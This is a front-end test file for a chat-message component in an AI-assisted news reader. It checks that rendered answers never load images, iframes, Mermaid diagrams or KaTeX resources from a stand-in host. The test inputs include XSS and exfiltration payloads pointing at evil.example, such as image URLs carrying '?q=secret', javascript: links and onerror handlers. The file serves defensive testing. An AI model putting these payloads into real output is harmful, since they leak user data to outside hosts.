import ChatMessage, { messageText } from "@/components/chat/chat-message";
import type { ChatUIMessage } from "@/lib/ai/chat/tools";
import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import Link from "next/link";
import { createElement, type ComponentProps } from "react";
import { describe, expect, it, vi } from "vitest";

// Renders the real next/link, recording its props: `prefetch` never reaches
// the DOM.
vi.mock("next/link", async (importOriginal) => {
  const { default: ActualLink } =
    await importOriginal<typeof import("next/link")>();
  return {
    default: vi.fn((props: ComponentProps<typeof ActualLink>) =>
      createElement(ActualLink, props),
    ),
  };
});

vi.mock("@/lib/repository/chatRepository", () => ({
  getArticlesForStatusChange: vi.fn(() => new Promise(() => {})),
}));

const assistant = (parts: unknown[]) =>
  ({ id: "a1", role: "assistant", parts }) as ChatUIMessage;

/** Elements a browser loads something for without a click. */
const FETCHING =
  "img, image, picture, source, video, audio, iframe, object, embed, script, link, input[type=image], foreignObject";

/** Attributes whose URL a browser loads without a click. */
const LOADED_URL_ATTRIBUTES = ["src", "srcset", "poster", "data", "xlink:href"];

/**
 * Nothing in the answer loads from evil.example by itself. An off-site `href`
 * is allowed only on an ordinary link, which needs a click and opens a tab.
 */
const expectNothingFetches = (container: HTMLElement) => {
  expect(container.querySelector(FETCHING)).toBeNull();
  for (const element of container.querySelectorAll("*")) {
    for (const { name, value } of element.attributes) {
      if (LOADED_URL_ATTRIBUTES.includes(name)) {
        expect(value).not.toContain("evil.example");
      }
      if (name === "style") {
        expect(value).not.toMatch(/url\(/i);
      }
      if (name === "href" && value.includes("evil.example")) {
        expect(element.tagName).toBe("A");
        expect(element).toHaveAttribute("target", "_blank");
        expect(element).toHaveAttribute("rel", "noopener noreferrer");
      }
    }
  }
};

const searchPart = (state: string, extra: object = {}) => ({
  type: "tool-searchArticles",
  toolCallId: `call-${state}-${Math.random()}`,
  state,
  input: {
    terms: ["Alphabet", "Google"],
    from: "2026-01-01",
    to: "2026-11-18",
    sort: "relevance",
    limit: 10,
  },
  ...extra,
});

const result = (id: number, title: string) => ({
  id,
  title,
  feed: "Markets Daily",
  published: "2026-04-25",
  status: "UNREAD",
  archived: false,
  lead: null,
  snippet: "",
  path: `/feed/1/article/${id}/text-summary`,
});

describe("ChatMessage", () => {
  it("shows the reader's question as plain text", () => {
    render(
      <ChatMessage
        message={
          {
            id: "u1",
            role: "user",
            parts: [{ type: "text", text: "What about Alphabet?" }],
          } as ChatUIMessage
        }
      />,
    );

    expect(screen.getByText("What about Alphabet?")).toBeInTheDocument();
  });

  it("renders the answer as Markdown, keeping in-app links in the tab", async () => {
    render(
      <ChatMessage
        message={assistant([
          {
            type: "text",
            text: "Shares rose ([Alphabet beats](/feed/1/article/2/text-summary)). See [source](https://example.com/a).",
          },
        ])}
      />,
    );

    const inApp = await screen.findByRole("link", { name: "Alphabet beats" });
    expect(inApp).toHaveAttribute("href", "/feed/1/article/2/text-summary");
    expect(inApp).not.toHaveAttribute("target");
    const external = screen.getByRole("link", { name: "source" });
    expect(external).toHaveAttribute("target", "_blank");
    expect(external).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("never points a protocol-relative link off-site", async () => {
    const { container } = render(
      <ChatMessage
        message={assistant([
          { type: "text", text: "See [odd](//evil.example/y). Done." },
        ])}
      />,
    );

    // Streamdown's link hardening keeps only the path, on this site.
    const link = await screen.findByRole("link", { name: "odd" });
    expect(link).toHaveAttribute("href", "/y");
    expect(link).not.toHaveAttribute("target");
    expect(container.innerHTML).not.toContain("evil.example");
    expect(vi.mocked(Link)).toHaveBeenCalledWith(
      expect.objectContaining({ href: "/y", prefetch: false }),
      undefined,
    );
  });

  it("styles in-app and external links as links", async () => {
    render(
      <ChatMessage
        message={assistant([
          {
            type: "text",
            text: "See [Alphabet beats](/feed/1/article/2/text-summary) and [source](https://example.com/a).",
          },
        ])}
      />,
    );

    for (const name of ["Alphabet beats", "source"]) {
      const link = await screen.findByRole("link", { name });
      expect(link).toHaveClass("text-primary", "underline");
    }
  });

  it("does not prefetch in-app links", async () => {
    render(
      <ChatMessage
        message={assistant([
          {
            type: "text",
            text: "See [Alphabet beats](/feed/1/article/2/text-summary).",
          },
        ])}
      />,
    );

    await screen.findByRole("link", { name: "Alphabet beats" });
    expect(vi.mocked(Link)).toHaveBeenCalledWith(
      expect.objectContaining({
        href: "/feed/1/article/2/text-summary",
        prefetch: false,
      }),
      undefined,
    );
  });

  it("keeps footnote links in the tab", async () => {
    const { container } = render(
      <ChatMessage
        message={assistant([
          {
            type: "text",
            text: "Shares rose.[^1]\n\n[^1]: Markets Daily, April 25.",
          },
        ])}
      />,
    );

    await screen.findByText(/Markets Daily, April 25/);
    const footnoteLinks = [
      ...container.querySelectorAll<HTMLAnchorElement>("a[href^='#']"),
    ];
    expect(footnoteLinks.length).toBeGreaterThan(0);
    for (const link of footnoteLinks) {
      expect(link).not.toHaveAttribute("target");
      expect(link).not.toHaveAttribute("rel");
    }
  });

  it("shows a blocked link as muted text without a link", async () => {
    const { container } = render(
      <ChatMessage
        message={assistant([
          { type: "text", text: "Click [here](javascript:alert(1)). Done." },
        ])}
      />,
    );

    await screen.findByText(/Done\./);
    expect(container.querySelector("[href]")).toBeNull();
    expect(container.innerHTML).not.toMatch(/text-gray-/);
  });

  it("never loads an image from an answer, Markdown or raw HTML", async () => {
    const { container } = render(
      <ChatMessage
        message={assistant([
          {
            type: "text",
            text: [
              "Here is the chart: ![chart](https://evil.example/p.png?q=secret)",
              "",
              '<img src="https://evil.example/raw.png">',
              "",
              "![](blob:https://evil.example/1234) ![x](ftp://evil.example/f.png)",
              "",
              "Done.",
            ].join("\n"),
          },
        ])}
      />,
    );

    await screen.findByText(/Done\./);
    expect(
      container.querySelector("img, picture, source, video, iframe"),
    ).toBeNull();
    // A blocked image shows only its alt text, with no gray "[Image blocked]"
    // badge.
    expect(container.textContent).toContain("x");
    expect(container.textContent).not.toContain("Image blocked");
    expect(container.innerHTML).not.toMatch(/gray-/);
    const attributes = [...container.querySelectorAll("*")].flatMap((element) =>
      [...element.attributes].map((attribute) => attribute.value),
    );
    expect(attributes.join(" ")).not.toContain("evil.example");
  });

  it("shows a Mermaid diagram as code instead of drawing it", async () => {
    const diagram = [
      "flowchart TD",
      '  A["<img src=https://evil.example/x>"] --> B',
      "  C[<img src=x onerror=alert(1)>]",
      '  D@{ img: "https://evil.example/shape.png", label: "x" }',
      '  click A "https://evil.example"',
    ].join("\n");
    const { container } = render(
      <ChatMessage
        message={assistant([
          { type: "text", text: `\`\`\`mermaid\n${diagram}\n\`\`\`\n\nDone.` },
        ])}
      />,
    );

    // Wait for the highlighter, so the final DOM is the one checked.
    await waitFor(
      () =>
        expect(
          container.querySelector(
            '[data-streamdown="code-block-body"][data-language="mermaid"] span[style]',
          ),
        ).not.toBeNull(),
      { timeout: 5000 },
    );
    expect(container.textContent).toContain(diagram.split("\n")[1].trim());
    expect(container.textContent).toContain('click A "https://evil.example"');
    expect(
      container.querySelector(
        '[data-streamdown^="mermaid"], svg[aria-roledescription], [role="img"]',
      ),
    ).toBeNull();
    expect(container.querySelector("[data-streamdown=code-block] [href]")).toBe(
      null,
    );
    expectNothingFetches(container);
  }, 10_000);

  it("renders math without loading images or making links", async () => {
    const { container } = render(
      <ChatMessage
        message={assistant([
          {
            type: "text",
            text: [
              "$$",
              "\\includegraphics{https://evil.example/x.png}",
              "$$",
              "",
              "$$\\includegraphics[height=1em]{https://evil.example/y.png}$$",
              "",
              "$$\\href{https://evil.example}{x}$$",
              "",
              "$$\\url{https://evil.example}$$",
              "",
              "$$\\htmlStyle{background:url(https://evil.example/z)}{z}$$",
              "",
              "Inline $\\href{https://evil.example}{x}$ stays text.",
              "",
              "$$x^2$$",
            ].join("\n"),
          },
        ])}
      />,
    );

    await screen.findByText(/stays text/);
    // KaTeX ran: the trusted-only commands show as their names, in error color.
    expect(container.querySelectorAll(".katex").length).toBe(6);
    expect(container.querySelector(".katex [href]")).toBeNull();
    expect(container.textContent).toContain("\\includegraphics");
    expectNothingFetches(container);
  });

  it("keeps HTML in a code block as escaped text", async () => {
    const { container } = render(
      <ChatMessage
        message={assistant([
          {
            type: "text",
            text: [
              "```html",
              "<img src=https://evil.example/x>",
              "```",
              "",
              "```",
              '<iframe src="https://evil.example/f"></iframe>',
              "```",
              "",
              "Inline `<img src=https://evil.example/i>` too.",
            ].join("\n"),
          },
        ])}
      />,
    );

    await waitFor(
      () =>
        expect(
          container.querySelector(
            '[data-streamdown="code-block-body"][data-language="html"] span[style]',
          ),
        ).not.toBeNull(),
      { timeout: 5000 },
    );
    expect(container.textContent).toContain("<img src=https://evil.example/x>");
    expect(container.textContent).toContain(
      '<iframe src="https://evil.example/f"></iframe>',
    );
    expect(container.textContent).toContain("<img src=https://evil.example/i>");
    expectNothingFetches(container);
  }, 10_000);

  it("describes each tool call and lists found articles", async () => {
    const user = userEvent.setup();
    render(
      <ChatMessage
        answering
        message={assistant([
          searchPart("input-available"),
          searchPart("output-available", {
            output: { results: [result(2, "Alphabet beats")] },
          }),
          searchPart("output-available", {
            output: { error: "Search is unavailable right now." },
          }),
          {
            type: "tool-getArticle",
            toolCallId: "call-get",
            state: "output-available",
            input: { id: 2 },
            output: {
              ...result(2, "Alphabet beats"),
              text: "",
              link: "",
              truncated: false,
            },
          },
          {
            type: "tool-getArticle",
            toolCallId: "call-missing",
            state: "output-available",
            input: { id: 3 },
            output: { error: "not found" },
          },
        ])}
      />,
    );

    // The header follows the latest step; the steps open on request.
    await user.click(screen.getByRole("button", { name: "Article not found" }));

    expect(
      screen.getByText("Searching: Alphabet, Google…"),
    ).toBeInTheDocument();
    expect(
      screen.getByText("Searched: Alphabet, Google · 2026-01-01 – 2026-11-18"),
    ).toBeInTheDocument();
    expect(screen.getByText("Search failed")).toBeInTheDocument();
    expect(screen.getByText("Read: Alphabet beats")).toBeInTheDocument();
    // Once in the header, once as a step.
    expect(screen.getAllByText("Article not found")).toHaveLength(2);
    expect(screen.getAllByText("Alphabet beats").length).toBeGreaterThan(0);
  });

  it("keeps the steps collapsed while the answer moves between tool calls", () => {
    const running = searchPart("input-available", {
      toolCallId: "call-1",
    });
    const done = {
      ...running,
      state: "output-available",
      output: { results: [result(2, "Alphabet beats")] },
    };
    const reading = {
      type: "tool-getArticle",
      toolCallId: "call-2",
      state: "input-available",
      input: { id: 2 },
    };
    const header = () => screen.getByRole("button", { expanded: false });
    const { rerender } = render(
      <ChatMessage answering message={assistant([running])} />,
    );

    expect(header()).toHaveTextContent("Searching: Alphabet, Google…");

    rerender(<ChatMessage answering message={assistant([done])} />);
    expect(header()).toHaveTextContent(
      "Searched: Alphabet, Google · 2026-01-01 – 2026-11-18",
    );

    rerender(<ChatMessage answering message={assistant([done, reading])} />);
    expect(header()).toHaveTextContent("Opening an article…");
    expect(screen.queryByText("Alphabet beats")).not.toBeInTheDocument();
  });

  it("keeps the steps open once the reader opens them", async () => {
    const user = userEvent.setup();
    const done = searchPart("output-available", {
      toolCallId: "call-1",
      output: { results: [result(2, "Alphabet beats")] },
    });
    const reading = {
      type: "tool-getArticle",
      toolCallId: "call-2",
      state: "input-available",
      input: { id: 2 },
    };
    const { rerender } = render(
      <ChatMessage answering message={assistant([done])} />,
    );

    await user.click(screen.getByRole("button", { expanded: false }));
    rerender(<ChatMessage answering message={assistant([done, reading])} />);
    rerender(
      <ChatMessage
        message={assistant([
          done,
          {
            ...reading,
            state: "output-available",
            output: { ...result(2, "Alphabet beats"), text: "", link: "" },
          },
        ])}
      />,
    );

    expect(screen.getByRole("button", { expanded: true })).toBeInTheDocument();
    expect(screen.getByText("Read: Alphabet beats")).toBeInTheDocument();
  });

  it("says the search is done once the answer is finished", () => {
    render(
      <ChatMessage
        message={assistant([
          searchPart("output-available", {
            output: { results: [result(2, "Alphabet beats")] },
          }),
        ])}
      />,
    );

    expect(screen.getByRole("button")).toHaveTextContent(
      "Searched your articles",
    );
  });
});

describe("ChatMessage actions", () => {
  const answer = assistant([{ type: "text", text: "Hello." }]);

  it("shows the actions under a finished answer", () => {
    render(<ChatMessage message={answer} actions={<button>Act</button>} />);

    expect(screen.getByRole("button", { name: "Act" })).toBeInTheDocument();
  });

  it("hides the actions while the answer is being written", () => {
    render(
      <ChatMessage message={answer} answering actions={<button>Act</button>} />,
    );

    expect(
      screen.queryByRole("button", { name: "Act" }),
    ).not.toBeInTheDocument();
  });
});

describe("messageText", () => {
  it("joins the text parts like paragraphs and leaves out tool calls", () => {
    expect(
      messageText(
        assistant([
          { type: "text", text: "First." },
          searchPart("output-available"),
          { type: "text", text: "Second." },
        ]),
      ),
    ).toBe("First.\n\nSecond.");
  });

  it("renders a status change as a card in place, outside the chain of thought", async () => {
    const onApprovalResponse = vi.fn();
    render(
      <ChatMessage
        onApprovalResponse={onApprovalResponse}
        message={
          {
            id: "a1",
            role: "assistant",
            parts: [
              { type: "text", text: "I found two articles." },
              {
                type: "tool-setArticleStatus",
                toolCallId: "call-1",
                state: "approval-requested",
                input: { ids: [1, 2], status: "DISMISSED" },
                approval: { id: "approval-1" },
              },
            ],
          } as never
        }
      />,
    );

    expect(screen.getByText("I found two articles.")).toBeInTheDocument();
    expect(screen.getByText("Loading the articles…")).toBeInTheDocument();
    expect(
      screen.queryByText("Searched your articles"),
    ).not.toBeInTheDocument();
  });
});
